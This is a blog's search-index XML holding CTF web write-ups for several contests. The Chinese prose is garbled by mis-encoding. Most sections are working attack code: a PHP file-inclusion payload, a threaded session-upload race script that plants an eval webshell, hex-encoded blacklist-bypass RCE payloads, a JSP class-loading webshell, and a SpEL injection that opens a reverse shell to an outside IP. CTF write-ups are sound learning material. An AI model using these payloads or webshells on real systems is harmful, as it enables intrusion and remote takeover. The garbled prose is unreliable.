<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Dest0g3520è¿æ–°èµ›</title>
    <link href="/2022/05/21/Dest0g3520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <url>/2022/05/21/Dest0g3520%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Dest0g3-520è¿æ–°èµ›"><a href="#Dest0g3-520è¿æ–°èµ›" class="headerlink" title="Dest0g3 520è¿æ–°èµ›"></a>Dest0g3 520è¿æ–°èµ›</h1><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><p>æ‰“å¼€é¢˜ç›®çœ‹äº†ä¸€ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>ä½¿ç”¨äº†require_once â€˜flag.phpâ€™ï¼Œåç»­å°±æ— æ³•è®¿é—®åˆ°flag.phpï¼Œç„¶åç™¾åº¦æœäº†ä¸€ä¸‹ï¼Œä¸¤ç§è§£æ³•ã€‚</p><blockquote><p>1ã€</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt;file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><p>2ã€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;<span class="hljs-keyword">import</span> requests<br>&gt;<span class="hljs-keyword">import</span> io<br>&gt;<span class="hljs-keyword">import</span> threading<br><br>&gt;url = <span class="hljs-string">&quot;http://ac5b25fb-48c1-408b-afc0-a7dd0498c216.node4.buuoj.cn:81/&quot;</span><br>&gt;sessionID = <span class="hljs-string">&quot;flag&quot;</span><br>&gt;data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;<br>&gt;<span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>&gt;<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">50</span>)<br>  resp = session.post(url=url,data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,f)&#125;,cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessionID&#125;)<br>&gt;<span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>&gt;<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  resp = session.post(url=<span class="hljs-string">&#x27;http://ac5b25fb-48c1-408b-afc0-a7dd0498c216.node4.buuoj.cn:81/?file=/tmp/sess_flag&#x27;</span>,data=data)<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>      <span class="hljs-built_in">print</span>(resp.text)<br>      event.clear()<br>  <span class="hljs-keyword">else</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=========retry==========&quot;</span>)<br>&gt;<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>&gt;event = threading.Event()<br>&gt;<span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):<br>      threading.Thread(target=write, args=(session,)).start()<br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):<br>      threading.Thread(target=read, args=(session,)).start()<br>&gt;event.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure></blockquote><p>è‡ªå·±å¤ªèœäº†~åç»­å†æ¥çœ‹çœ‹åŸç†ã€‚</p><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fl4g.php&quot;</span>;<br><span class="hljs-variable">$dest0g3</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-variable">$timme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>);<br><span class="hljs-variable">$timmme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;i&quot;</span>);<br><span class="hljs-keyword">if</span>((<span class="hljs-variable">$time</span> &gt; <span class="hljs-string">&quot;24&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timme</span> &gt; <span class="hljs-string">&quot;31&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timmme</span> &gt; <span class="hljs-string">&quot;60&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fl4g</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try harder!&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<br>    <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">use</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$fl4g</span></span>) </span>&#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-variable">$fl4g</span>;<br>    &#125;<br>);<br><span class="hljs-variable">$fl4g</span> .= <span class="hljs-variable">$dest0g3</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>è§¦å‘ç‚¹å°±æ˜¯åˆ¶é€ ä¸ªæŠ¥é”™(set_error_handler)çš„è¡Œä¸ºã€‚ç„¶åä¼šprint $fl4gã€‚è¿™é‡Œå…·ä½“ä¸ºä»€ä¹ˆä¼šæ˜¯æ•°ç»„ï¼Ÿï¼ˆæˆ‘åªæ˜¯çµå…‰ä¸€é—ªï¼‰ï¼Œåœ¨æˆ‘è‡ªå·±æœ¬åœ°å®éªŒä¸­ï¼Œä¼šå°†æ•°ç»„è½¬å˜ä¸ºArrayï¼ˆæ¶‰åŠåº•å±‚å­ï¼Ÿï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202205212117668.png" alt="image-20220521211728596"></p><h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$aaa</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>];<br><span class="hljs-variable">$black_list</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;^&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;preg&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%0&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;char&#x27;</span>,<span class="hljs-string">&#x27;decode&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;md5&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;ascii&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;replace&#x27;</span>,<span class="hljs-string">&#x27;assert&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;var&#x27;</span>,<span class="hljs-string">&#x27;pastre&#x27;</span>,<span class="hljs-string">&#x27;print&#x27;</span>,<span class="hljs-string">&#x27;tail&#x27;</span>,<span class="hljs-string">&#x27;sed&#x27;</span>,<span class="hljs-string">&#x27;pcre&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;scan&#x27;</span>,<span class="hljs-string">&#x27;decode&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;func&#x27;</span>,<span class="hljs-string">&#x27;diff&#x27;</span>,<span class="hljs-string">&#x27;ini_&#x27;</span>,<span class="hljs-string">&#x27;passthru&#x27;</span>,<span class="hljs-string">&#x27;pcntl&#x27;</span>,<span class="hljs-string">&#x27;proc_open&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;tac&#x27;</span>,<span class="hljs-string">&#x27;more&#x27;</span>,<span class="hljs-string">&#x27;sort&#x27;</span>,<span class="hljs-string">&#x27;log&#x27;</span>,<span class="hljs-string">&#x27;current&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;cut&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;nl&#x27;</span>,<span class="hljs-string">&#x27;wget&#x27;</span>,<span class="hljs-string">&#x27;vi&#x27;</span>,<span class="hljs-string">&#x27;grep&#x27;</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¸Špayloadäº†ã€‚</p><blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&gt;aaa=hex2bin(&#x27;<span class="hljs-number">7379737465</span>6d&#x27;)(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&gt;aaa=hex2bin(&#x27;<span class="hljs-number">7379737465</span>6d&#x27;)(&#x27;uniq /fl*&#x27;);<br></code></pre></td></tr></table></figure></blockquote><p>è¿™é‡Œå½“ç„¶è¿˜æœ‰å…¶ä»–çš„è§£æ³•ï¼ˆä¾‹å¦‚ï¼šrevï¼ˆå€’ç€è¯»ï¼‰ï¼Œod 8è¿›åˆ¶è¾“å‡ºï¼‰</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">aaa</span>=hex2bin(<span class="hljs-string">&#x27;73797374656d&#x27;</span>)(<span class="hljs-string">&#x27;rev /fl*&#x27;</span>)<span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">aaa</span>=hex2bin(<span class="hljs-string">&#x27;73797374656d&#x27;</span>)(<span class="hljs-string">&#x27;od -w3 -b /fl*&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="é™„ä¸Šç®€é™‹çš„8è½¬ascii"><a href="#é™„ä¸Šç®€é™‹çš„8è½¬ascii" class="headerlink" title="é™„ä¸Šç®€é™‹çš„8è½¬ascii"></a>é™„ä¸Šç®€é™‹çš„8è½¬ascii</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>= <span class="hljs-string">&quot;104 145 163 164 060 147 063 173 063 144 145 143 142 062 146 064 055 065 060 143 066 055 064 146 063 063 055 071 064 066 143 055 143 070 066 071 146 144 063 066 070 067 143 065 175 012&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$i</span>=<span class="hljs-variable">$i</span>+<span class="hljs-number">4</span>)&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$i</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-variable">$hex</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-variable">$c</span>,<span class="hljs-number">8</span>,<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex</span>);<br>    <span class="hljs-variable">$b</span>.=<span class="hljs-variable">$str1</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF</title>
    <link href="/2022/04/27/MRCTF/"/>
    <url>/2022/04/27/MRCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a>MRCTF</h1><h2 id="Java-mem-shell-Filter"><a href="#Java-mem-shell-Filter" class="headerlink" title="Java_mem_shell_Filter"></a>Java_mem_shell_Filter</h2><p>ä¸€è¿›å»ä¸€ä¸ªç™»å½•æ¡†ã€‚emmmç¬¬ä¸€æ—¶é—´å°±æƒ³åˆ°äº†è€ƒç‚¹ä¸ºlog4jï¼å°±ç®€å†™äº†ã€‚è¿™é‡Œåœ¨åˆ©ç”¨dnslogæ¢æµ‹å‡ºç»“æœåï¼Œç›´æ¥åˆ©ç”¨JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jarã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204271710041.png" alt="QQæˆªå›¾20220427104501"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204271046567.png" alt="QQæˆªå›¾20220427104632"></p><p>ç¡®å®ä¹Ÿæ˜¯æˆåŠŸåå¼¹shellï¼Œä½†æ˜¯æ‰¾äº†å¾ˆä¹…æ‰¾ä¸åˆ°flagåœ¨å“ªé‡Œã€‚ç­‰å®˜æ–¹wpäº†~~</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204271710729.png" alt="QQæˆªå›¾20220427104739"></p><h2 id="Java-mem-shell-Basic"><a href="#Java-mem-shell-Basic" class="headerlink" title="Java_mem_shell_Basic"></a>Java_mem_shell_Basic</h2><p>æœ‰ä¸ªå°å°çš„ç–‘é—®ï¼Ÿä¸ºä»€ä¹ˆflagè¦æ”¾é‚£ä¹ˆéšè”½å‘¢ï¼Ÿ<br>å¼±å£ä»¤tomcat\tomcatç™»å…¥åå°ã€‚<br>æ„é€ jspæœ¨é©¬ï¼ŒèšğŸ—¡é“¾æ¥ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;%!<br>    <span class="hljs-keyword">class</span> U extends ClassLoader &#123;<br>        <span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span> &#123;<br>            super(c);<br>        &#125;<br>        public Class g(byte<span class="hljs-literal">[]</span> b) &#123;<br>            return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>, 0, <span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;<br>        &#125;<br>    &#125;<br> <br>    public byte<span class="hljs-literal">[]</span> base64<span class="hljs-constructor">Decode(String <span class="hljs-params">str</span>)</span> throws Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>)</span>;<br>            return (byte<span class="hljs-literal">[]</span>) clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(clazz.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>, str);<br>        &#125; catch (Exception e) &#123;<br>            Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.Base64&quot;</span>)</span>;<br>            Object decoder = clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getDecoder&quot;</span>)</span>.invoke(null);<br>            return (byte<span class="hljs-literal">[]</span>) decoder.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;decode&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String cls = request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;passwd&quot;</span>)</span>;<br>    <span class="hljs-keyword">if</span> (cls != null) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(base64<span class="hljs-constructor">Decode(<span class="hljs-params">cls</span>)</span>).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);<br>    &#125;<br>%&gt;<br><br><span class="hljs-comment">//å¯†ç ä¸ºpasswd</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204271710210.png" alt="QQæˆªå›¾20220427113710"></p><p>ç„¶åä¸Šä¼ ä¸€ä¸‹å°±è¡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204271710451.png" alt="QQæˆªå›¾20220427113804"></p><p>èšğŸ—¡é“¾æ¥ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-regexp">/usr/</span>local/apache-tomcat-<br><span class="hljs-number">8.0</span>.<span class="hljs-number">12</span><span class="hljs-regexp">/work/</span>Catalina<span class="hljs-regexp">/localhost/</span>ROOT<span class="hljs-regexp">/org/</span>apache<span class="hljs-regexp">/jsp/</span>threatbook_jsp.java<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204271138869.png" alt="QQæˆªå›¾20220427113836"></p><p>åœ¨çŸ¥é“è·¯å¾„ä¹‹åï¼Œåˆæƒ³äº†æƒ³ï¼Œå…¶å®è¿™ä¹ˆå‡ºå¯èƒ½å°±æ˜¯æƒ³è®©æˆ‘ä»¬å¯»æ‰¾ä¸€ä¸‹ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204271710647.png" alt="QQæˆªå›¾20220427114400"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> . -name <span class="hljs-string">&quot;threatbook*&quot;</span> | xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;MRCTF&quot;</span><br></code></pre></td></tr></table></figure><p>emmmå¯ä»¥è¿™ä¹ˆç†è§£å­~~</p>]]></content>
    
    
    <categories>
      
      <category>javaCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘åˆƒæ¯</title>
    <link href="/2022/04/26/%E7%BD%91%E5%88%83%E6%9D%AF/"/>
    <url>/2022/04/26/%E7%BD%91%E5%88%83%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="ç½‘åˆƒæ¯"><a href="#ç½‘åˆƒæ¯" class="headerlink" title="ç½‘åˆƒæ¯"></a>ç½‘åˆƒæ¯</h1><h1 id="EZjava"><a href="#EZjava" class="headerlink" title="EZjava"></a>EZjava</h1><p>ä¸ç†è§£ä¸ºä»€ä¹ˆ  è®¿é—®è·¯å¾„ä¸‹è½½ä¸ºä»€ä¹ˆæ˜¯ <code>../../../web.xml</code></p><p>å¾—åˆ°web.xmlä¹‹å<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204262242463.png" alt="QQæˆªå›¾20220426223312"></p><p>ç»§ç»­ä¸‹è½½çœ‹çœ‹ã€‚<br><code>../../../classes/com/abc/servlet/DownloadServlet.class</code><br><code>../../../classes/com/abc/servlet/TestServlet.class</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204262235283.png" alt="QQæˆªå›¾20220426223520"></p><p>è¿™é‡Œæˆ‘åœ¨ä½¿ç”¨<strong>java.lang.Runtime</strong>åå¼¹shellå¤±è´¥ã€‚</p><h2 id="è§£æ³•"><a href="#è§£æ³•" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">name=#&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMTQuOTguMjAzLzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;).start().getInputStream(), <span class="hljs-string">&quot;gbk&quot;</span>)).readLine()&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204262242149.png" alt="QQæˆªå›¾20220426224127"></p><h3 id="å›æ˜¾"><a href="#å›æ˜¾" class="headerlink" title="å›æ˜¾"></a>å›æ˜¾</h3><h4 id="åˆ©ç”¨-ProcessBuilder"><a href="#åˆ©ç”¨-ProcessBuilder" class="headerlink" title="åˆ©ç”¨ ProcessBuilder"></a>åˆ©ç”¨ ProcessBuilder</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">name=#&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;&#123;echo,bHMgL3xiYXNlNjQ=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;).start().getInputStream(), <span class="hljs-string">&quot;gbk&quot;</span>)).readLine()&#125; <span class="hljs-comment">//è¯»å–æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¼šå¾—åˆ°æ ¹ç›®å½•ä¸‹æ–‡ä»¶çš„base64ç¼–ç 